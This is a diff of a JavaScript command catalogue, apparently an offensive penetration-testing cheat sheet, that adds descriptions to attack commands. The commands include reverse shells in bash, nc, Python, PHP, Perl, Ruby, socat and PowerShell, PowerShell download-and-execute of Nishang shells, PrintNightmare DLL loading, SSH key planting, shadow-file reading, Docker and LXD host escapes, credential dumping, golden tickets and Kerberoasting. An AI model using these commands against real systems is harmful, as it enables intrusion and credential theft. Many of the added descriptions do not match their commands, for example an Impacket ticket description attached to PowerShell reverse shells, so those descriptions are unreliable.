       "explain": "Loads an attacker DLL as SYSTEM via the Print Spooler bug (CVE-2021-1675), remotely:\n  CVE-2021-1675.py         the impacket-based exploit\n  <domain>/<user>:<password>@<dc_ip>   authenticated domain creds and the target\n  '\\\\<attacker_ip>\\smb\\shell.dll'   UNC path to your malicious driver DLL on an SMB share\nThe spooler installs the driver and executes your DLL as SYSTEM. Invoke-Nightmare is the local PowerShell variant that just adds an admin."
@@ -114839,11 +115567,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Use a stolen private key",
-          "command": "vim id_rsa\nchmod 600 id_rsa\nssh root@<ip> -i id_rsa"
+          "command": "vim id_rsa\nchmod 600 id_rsa\nssh root@<ip> -i id_rsa",
+          "description": "Uses vim's shell escape feature for privilege escalation. If vim can be run via sudo, the :!/bin/bash command spawns a root shell."
         },
         {
           "label": "Plant your own key",
-          "command": "ssh-keygen -f key\necho \"ssh-rsa AAAAB...M= user@parrot\" >> /root/.ssh/authorized_keys\nssh root@<ip> -i key"
+          "command": "ssh-keygen -f key\necho \"ssh-rsa AAAAB...M= user@parrot\" >> /root/.ssh/authorized_keys\nssh root@<ip> -i key",
+          "description": "Connects to a remote host via SSH. Provides encrypted shell access and can create tunnels for pivoting."
         }
       ],
       "opsec": "loud",
@@ -115518,7 +116248,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Read shadow via debugfs",
-          "command": "debugfs -R 'cat /etc/shadow' /dev/sda1"
+          "command": "debugfs -R 'cat /etc/shadow' /dev/sda1",
+          "description": "Reads password hashes from /etc/shadow (requires root). Hashes can be cracked offline with Hashcat or John to recover plaintext passwords."
         }
       ],
       "steps": [
@@ -115731,11 +116462,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Mount host root + chroot",
-          "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+          "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+          "description": "Exploits Docker group membership to mount the host filesystem into a container. If your user is in the docker group, this gives effective root access to the entire host filesystem."
         },
         {
           "label": "Read a root file directly",
-          "command": "docker run -v /:/mnt --rm -it alpine cat /mnt/root/root.txt"
+          "command": "docker run -v /:/mnt --rm -it alpine cat /mnt/root/root.txt",
+          "description": "Exploits Docker group membership to mount the host filesystem into a container. If your user is in the docker group, this gives effective root access to the entire host filesystem."
         }
       ],
       "steps": [
@@ -115949,7 +116682,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Use a static docker binary against the socket",
-          "command": "/tmp/docker -H unix:///app/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
+          "command": "/tmp/docker -H unix:///app/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh",
+          "description": "Use a static docker binary against the socket. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Talks to the host Docker daemon through a docker.sock mounted in the container:\n  /tmp/docker              an uploaded docker client\n  -H unix:///app/docker.sock   target the mounted host daemon socket\n  run --rm -d --privileged   launch a throwaway privileged container\n  -v /:/hostsystem         bind-mount the host root filesystem into it\n  main_app                 the image to run\nExec into it and read /hostsystem/root/.ssh/id_rsa - full host access. A one-liner alpine chroot variant does the same."
@@ -116146,7 +116880,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Import a prebuilt alpine image",
-          "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias r00t"
+          "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias r00t",
+          "description": "Import a prebuilt alpine image. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Escapes to host root via lxd/lxc group by launching a privileged container:\n  lxc init <image> r00t    create a container named r00t from an imported image\n  -c security.privileged=true   run it privileged (no UID remapping)\nThen lxc config device add mounts the host / into it, and lxc exec drops you into a shell with root read/write of the host filesystem under /mnt/root."
@@ -116213,15 +116948,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "OpenSSL encrypt / decrypt",
-          "command": "openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\nopenssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd"
+          "command": "openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\nopenssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd",
+          "description": "Encrypts or decrypts data using OpenSSL. Used for file encryption, data obfuscation, or decrypting captured encrypted content."
         },
         {
           "label": "PowerShell AES - file",
-          "command": "Import-Module .\\Invoke-AESEncryption.ps1\nInvoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\nInvoke-AESEncryption -Mode Decrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt.aes"
+          "command": "Import-Module .\\Invoke-AESEncryption.ps1\nInvoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\nInvoke-AESEncryption -Mode Decrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt.aes",
+          "description": "Encrypts or decrypts data using AES in PowerShell. Used to protect payloads or exfiltrated data in transit, or to decrypt captured AES-encrypted content."
         },
         {
           "label": "PowerShell AES - string",
-          "command": "Invoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\"\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"<base64>\""
+          "command": "Invoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\"\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"<base64>\"",
+          "description": "Encrypts or decrypts data using AES in PowerShell. Used to protect payloads or exfiltrated data in transit, or to decrypt captured AES-encrypted content."
         }
       ],
       "opsec": "quiet",
@@ -116541,7 +117279,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Quiet mode",
-          "command": "proxychains -q <command>"
+          "command": "proxychains -q <command>",
+          "description": "Routes commands through a SOCKS proxy (e.g., from Chisel or SSH tunnel) for pivoting. Makes local tools appear to run from the compromised network segment."
         }
       ],
       "explain": "Forces a tool's TCP traffic through the SOCKS/HTTP proxy configured in /etc/proxychains.conf:\n  proxychains <command>   run any command with its connections redirected through the proxy\nLets non-SOCKS-aware tools reach the internal network via your pivot tunnel; use nmap -sT (full TCP connect) since raw/SYN scans do not tunnel, and -q to silence proxychains output."
@@ -116994,11 +117733,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "wmiexec with ticket",
-          "command": "KRB5CCNAME=<ccache> wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+          "command": "KRB5CCNAME=<ccache> wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>",
+          "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
         },
         {
           "label": "smbexec with ticket",
-          "command": "KRB5CCNAME=<ccache> smbexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+          "command": "KRB5CCNAME=<ccache> smbexec.py -k -no-pass <domain>/<user>@<target_fqdn>",
+          "description": "Uses Impacket smbexec for command execution through the Windows Service Control Manager. Sends commands via SMB without uploading a binary - each command creates a temporary batch file on the target."
         }
       ],
       "steps": [
@@ -117377,11 +118118,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Parse live LSA (needs SeDebug on-host)",
-          "command": "pypykatz live lsa"
+          "command": "pypykatz live lsa",
+          "description": "Parse live LSA (needs SeDebug on-host). See the command syntax for exact parameters and flags."
         },
         {
           "label": "From registry hives",
-          "command": "pypykatz registry --sam sam.save system.save"
+          "command": "pypykatz registry --sam sam.save system.save",
+          "description": "Parses LSASS memory dumps or SAM/SYSTEM hives offline using pypykatz (Python). Linux-based alternative to Mimikatz for extracting credentials from captured dump files."
         }
       ],
       "steps": [
@@ -117459,19 +118202,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Writable module file",
-          "command": "# overwrite the imported module, defining the called function:\ncat > /usr/local/lib/python3.8/dist-packages/psutil/__init__.py << 'EOF'\nimport os\nclass Mem:\n    available = 100\n    total = 100\ndef virtual_memory():\n    os.system('/bin/bash')\n    return Mem()\nEOF"
+          "command": "# overwrite the imported module, defining the called function:\ncat > /usr/local/lib/python3.8/dist-packages/psutil/__init__.py << 'EOF'\nimport os\nclass Mem:\n    available = 100\n    total = 100\ndef virtual_memory():\n    os.system('/bin/bash')\n    return Mem()\nEOF",
+          "description": "Python reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Writable sys.path dir",
-          "command": "# place a same-named module earlier in sys.path (e.g. /usr/lib/python3.8/psutil.py):\nprintf '#!/usr/bin/env python3\\nimport os\\ndef virtual_memory():\\n    os.system(\"id\")\\n' > /usr/lib/python3.8/psutil.py"
+          "command": "# place a same-named module earlier in sys.path (e.g. /usr/lib/python3.8/psutil.py):\nprintf '#!/usr/bin/env python3\\nimport os\\ndef virtual_memory():\\n    os.system(\"id\")\\n' > /usr/lib/python3.8/psutil.py",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "PYTHONPATH (SETENV allowed)",
-          "command": "sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py"
+          "command": "sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py",
+          "description": "PYTHONPATH (SETENV allowed). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Writable script",
-          "command": "echo 'import os; os.system(\"/bin/bash\")' >> /path/to/script.py"
+          "command": "echo 'import os; os.system(\"/bin/bash\")' >> /path/to/script.py",
+          "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         }
       ],
       "steps": [
@@ -117679,11 +118426,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "rlogin",
-          "command": "rlogin <ip> -l <user>"
+          "command": "rlogin <ip> -l <user>",
+          "description": "Connects to a remote host using the legacy rlogin protocol. Rlogin trusts .rhosts-based authentication - if configured, allows login without a password based on the source host and user."
         },
         {
           "label": "Enumerate users on the network",
-          "command": "rwho\nrusers -al <ip>"
+          "command": "rwho\nrusers -al <ip>",
+          "description": "Enumerate users on the network. See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "moderate",
@@ -118026,7 +118775,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Pass-the-hash instead of password",
-          "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin> -hashes <lm>:<nt>"
+          "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin> -hashes <lm>:<nt>",
+          "description": "Pass-the-hash instead of password. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -118116,11 +118866,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "rdp-sec-check",
-          "command": "git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check\n./rdp-sec-check.pl <ip>"
+          "command": "git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check\n./rdp-sec-check.pl <ip>",
+          "description": "Clones a git repository. Exposed .git directories on web servers or accessible repos may contain source code, credentials, and configuration secrets."
         },
         {
           "label": "Connect with xfreerdp",
-          "command": "xfreerdp /u:<user> /p:\"P455w0rd!\" /v:<ip>"
+          "command": "xfreerdp /u:<user> /p:\"P455w0rd!\" /v:<ip>",
+          "description": "Connects to a Windows host via RDP using xfreerdp from Linux. Provides a graphical remote desktop session with file sharing and clipboard support."
         }
       ],
       "opsec": "moderate",
@@ -118297,11 +119049,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "xfreerdp",
-          "command": "xfreerdp /v:<ip> /u:<user> /p:'HTB_@cademy_stdnt!' /drive:linux,/home/user/rdp-share"
+          "command": "xfreerdp /v:<ip> /u:<user> /p:'HTB_@cademy_stdnt!' /drive:linux,/home/user/rdp-share",
+          "description": "Connects to a Windows host via RDP using xfreerdp from Linux. Provides a graphical remote desktop session with file sharing and clipboard support."
         },
         {
           "label": "rdesktop",
-          "command": "rdesktop <ip> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'"
+          "command": "rdesktop <ip> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'",
+          "description": "Connects to a Windows host via RDP using rdesktop from Linux. Basic RDP client for graphical remote access to Windows machines."
         }
       ],
       "opsec": "quiet",
@@ -119051,9 +119805,9 @@ const COMMAND_DATA = {
           "label": "SSL info"
         },
         {
-          "description": "Crawl + Wayback URLs",
           "command": "./finalrecon.py --crawl --wayback --url http://<domain>",
-          "label": "Crawl + wayback"
+          "label": "Crawl + wayback",
+          "description": "Performs comprehensive OSINT reconnaissance on a target domain. Combines multiple recon techniques including headers, whois, DNS, SSL, and crawling."
         },
         {
           "description": "Fast port scan + directory search",
@@ -119322,11 +120076,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "One-line environment summary",
-          "command": "\"LangMode=$($ExecutionContext.SessionState.LanguageMode)\"; whoami /priv | findstr /i \"SeImpersonate SeBackup SeDebug SeLoadDriver\"; klist"
+          "command": "\"LangMode=$($ExecutionContext.SessionState.LanguageMode)\"; whoami /priv | findstr /i \"SeImpersonate SeBackup SeDebug SeLoadDriver\"; klist",
+          "description": "One-line environment summary. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Check if AMSI is likely active (quick)",
-          "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') -ne $null"
+          "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') -ne $null",
+          "description": "Bypasses the Antimalware Scan Interface (AMSI) in the current PowerShell session. AMSI inspects PowerShell scripts before execution - patching it allows running tools that would otherwise be blocked by AV."
         }
       ],
       "explain": "Before loading any offensive PowerShell, checks what defenses are watching so you pick the right bypass:\n  $ExecutionContext.SessionState.LanguageMode   FullLanguage vs ConstrainedLanguage (CLM changes what you can run)\nFollow with whoami /all (privileges/groups), klist (current tickets), Get-AppLockerPolicy -Effective (allow-listing), and Get-MpComputerStatus/Get-MpPreference (Defender status + exclusion paths). Knowing this avoids burning the host with the wrong tool."
@@ -122442,11 +123198,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Set RBCD with PowerView",
-          "command": "Set-DomainRBCD -Identity <target_computer> -DelegateFrom '<attacker_computer>$' -Verbose"
+          "command": "Set-DomainRBCD -Identity <target_computer> -DelegateFrom '<attacker_computer>$' -Verbose",
+          "description": "Configures Resource-Based Constrained Delegation (RBCD) on a target computer. Writes to msDS-AllowedToActOnBehalfOfOtherIdentity so a controlled account can impersonate any user to services on the target."
         },
         {
           "label": "Read back RBCD config",
-          "command": "Get-DomainRBCD"
+          "command": "Get-DomainRBCD",
+          "description": "Configures Resource-Based Constrained Delegation (RBCD) on a target computer. Writes to msDS-AllowedToActOnBehalfOfOtherIdentity so a controlled account can impersonate any user to services on the target."
         }
       ],
       "explain": "Writes msDS-AllowedToActOnBehalfOfOtherIdentity on a computer you can write to, setting up RBCD:\n  Set-ADComputer -Identity <target_computer>   the victim computer object\n  -PrincipalsAllowedToDelegateToAccount <attacker_computer>$   the machine account allowed to impersonate to it\nRequires GenericWrite/WriteDACL on the target. Then Rubeus s4u (S4U2Self+S4U2Proxy) as <attacker_computer>$ mints a service ticket to the target impersonating Administrator."
@@ -122644,11 +123402,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Analyze-only (no poisoning)",
-          "command": "sudo responder -I <interface> -A"
+          "command": "sudo responder -I <interface> -A",
+          "description": "Analyze-only (no poisoning). See the command syntax for exact parameters and flags."
         },
         {
           "label": "With WPAD + verbose",
-          "command": "sudo responder -I <interface> -wv"
+          "command": "sudo responder -I <interface> -wv",
+          "description": "Executes a command with root privileges through sudo. Requires sudo permissions for the specific command."
         }
       ],
       "steps": [
@@ -123744,39 +124504,48 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Bash (fd 196)",
-          "command": "0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196"
+          "command": "0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196",
+          "description": "Bash reverse shell using file descriptor 196 for the TCP connection. Alternative to the /dev/tcp method that works on some systems where the standard bash reverse shell fails."
         },
         {
           "label": "nc mkfifo",
-          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f"
+          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f",
+          "description": "Netcat reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "nc -e",
-          "command": "nc -e /bin/sh <lhost> <lport>"
+          "command": "nc -e /bin/sh <lhost> <lport>",
+          "description": "Netcat reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Python3",
-          "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+          "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
+          "description": "Python reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "PHP",
-          "command": "php -r '$s=fsockopen(\"<lhost>\",<lport>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+          "command": "php -r '$s=fsockopen(\"<lhost>\",<lport>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+          "description": "PHP reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Perl",
-          "command": "perl -e 'use Socket;$i=\"<lhost>\";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+          "command": "perl -e 'use Socket;$i=\"<lhost>\";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+          "description": "Perl reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Ruby",
-          "command": "ruby -rsocket -e'f=TCPSocket.open(\"<lhost>\",<lport>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+          "command": "ruby -rsocket -e'f=TCPSocket.open(\"<lhost>\",<lport>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+          "description": "Ruby reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "socat",
-          "command": "socat TCP:<lhost>:<lport> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"
+          "command": "socat TCP:<lhost>:<lport> EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
+          "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "PowerShell",
-          "command": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\""
+          "command": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\"",
+          "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
         }
       ],
       "opsec": "loud",
@@ -123849,23 +124618,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Linux bash",
-          "command": "bash -c 'bash -i >& /dev/tcp/<lhost>/1234 0>&1'"
+          "command": "bash -c 'bash -i >& /dev/tcp/<lhost>/1234 0>&1'",
+          "description": "Bash reverse shell using /dev/tcp for the network connection. The most common Linux reverse shell one-liner - redirects stdin/stdout/stderr through a TCP connection back to your listener."
         },
         {
           "label": "Linux mkfifo (sh)",
-          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 1234 >/tmp/f"
+          "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 1234 >/tmp/f",
+          "description": "Netcat reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         },
         {
           "label": "Windows PowerShell",
-          "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<lhost>',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\""
+          "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<lhost>',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"",
+          "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
         },
         {
           "label": "Windows Nishang Invoke-PowerShellTcp (download + exec)",
-          "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\""
+          "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\"",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         },
         {
           "label": "Windows Nishang Invoke-PowerShellTcpEx (AES-encrypted)",
-          "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcpEx.ps1');Invoke-PowerShellTcpEx -Reverse -IPAddress <lhost> -Port <lport>\""
+          "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcpEx.ps1');Invoke-PowerShellTcpEx -Reverse -IPAddress <lhost> -Port <lport>\"",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         }
       ],
       "opsec": "loud",
@@ -124067,11 +124841,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "FTP",
-          "command": "http://<ip>:<port>/index.php?language=ftp://<lhost>/shell.php&cmd=id"
+          "command": "http://<ip>:<port>/index.php?language=ftp://<lhost>/shell.php&cmd=id",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "SMB (Windows)",
-          "command": "http://<ip>:<port>/index.php?language=\\\\<lhost>\\share\\shell.php&cmd=whoami"
+          "command": "http://<ip>:<port>/index.php?language=\\\\<lhost>\\share\\shell.php&cmd=whoami",
+          "description": "File upload bypass using mixed-case extension (.PhP). Circumvents case-sensitive file extension blacklists while PHP still processes the file."
         }
       ],
       "opsec": "loud",
@@ -124416,11 +125192,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enum domain users via RPC",
-          "command": "rpcclient -U \"\" -N <dc_ip> -c 'enumdomusers'"
+          "command": "rpcclient -U \"\" -N <dc_ip> -c 'enumdomusers'",
+          "description": "Enumerates all domain users through an RPC null session. If null sessions are allowed, lists every user account without any credentials - a critical misconfiguration finding."
         },
         {
           "label": "Query a user by RID",
-          "command": "rpcclient -U \"\" -N <dc_ip> -c 'queryuser 0x1f4'"
+          "command": "rpcclient -U \"\" -N <dc_ip> -c 'queryuser 0x1f4'",
+          "description": "Queries detailed information about a specific user by their RID via RPC. Returns account name, description, logon times, and flags for a targeted user lookup."
         }
       ],
       "steps": [
@@ -124622,7 +125400,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Loop over a userlist",
-          "command": "for u in $(cat <userlist>); do rpcclient -U \"$u%<password>\" -c 'getusername;quit' <dc_ip> 2>&1 | grep -v NT_STATUS; done"
+          "command": "for u in $(cat <userlist>); do rpcclient -U \"$u%<password>\" -c 'getusername;quit' <dc_ip> 2>&1 | grep -v NT_STATUS; done",
+          "description": "Connects to the target via RPC for Windows domain enumeration from Linux. Supports null session authentication when misconfigured."
         }
       ],
       "explain": "Sprays a password over MS-RPC as a fallback when Kerberos/SMB spray is blocked:\n  for u in $(cat <userlist>)   loop over each username\n  rpcclient -U \"$u%<password>\"   authenticate as user%password\n  -c 'getusername;quit' <dc_ip>   run a trivial command to test the login\n  | grep 'Account Name'    a successful auth returns this; failures do not\nOne password across the whole list over port 445/TCP."
@@ -124894,15 +125673,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Scan + probe",
-          "command": "sudo nmap -sV -p 873 127.0.0.1\nnc -nv 127.0.0.1 873"
+          "command": "sudo nmap -sV -p 873 127.0.0.1\nnc -nv 127.0.0.1 873",
+          "description": "Runs an nmap scan with version detection for detailed service enumeration and target analysis."
         },
         {
           "label": "Download a share",
-          "command": "rsync -av rsync://127.0.0.1/dev"
+          "command": "rsync -av rsync://127.0.0.1/dev",
+          "description": "Connects to an rsync service to list or transfer files. Exposed rsync services (port 873) may allow reading or writing files without authentication."
         },
         {
           "label": "Over SSH",
-          "command": "rsync -av -e ssh rsync://127.0.0.1/dev\nrsync -av -e \"ssh -p2222\" rsync://127.0.0.1/dev"
+          "command": "rsync -av -e ssh rsync://127.0.0.1/dev\nrsync -av -e \"ssh -p2222\" rsync://127.0.0.1/dev",
+          "description": "Connects to an rsync service to list or transfer files. Exposed rsync services (port 873) may allow reading or writing files without authentication."
         }
       ],
       "opsec": "moderate",
@@ -125258,11 +126040,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Roast all vulnerable users",
-          "command": ".\\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+          "command": ".\\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt",
+          "description": "Uses Rubeus to perform AS-REP Roasting - identifies and requests authentication data for accounts without pre-authentication. The output can be cracked offline to recover passwords."
         },
         {
           "label": "Specific user",
-          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+          "command": ".\\Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap",
+          "description": "Uses Rubeus to perform AS-REP Roasting - identifies and requests authentication data for accounts without pre-authentication. The output can be cracked offline to recover passwords."
         }
       ],
       "steps": [
@@ -125496,11 +126280,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "AES256 (stealthier than RC4)",
-          "command": ".\\Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+          "command": ".\\Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "Save ticket to file",
-          "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /outfile:golden.kirbi"
+          "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /outfile:golden.kirbi",
+          "description": "Uses Rubeus to compute Kerberos encryption keys (RC4/AES128/AES256) from a plaintext password. These keys are needed for forging tickets (golden/silver/diamond tickets)."
         }
       ],
       "steps": [
@@ -125708,19 +126494,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "OPSEC (skip AES accounts)",
-          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt"
+          "command": ".\\Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.txt",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         },
         {
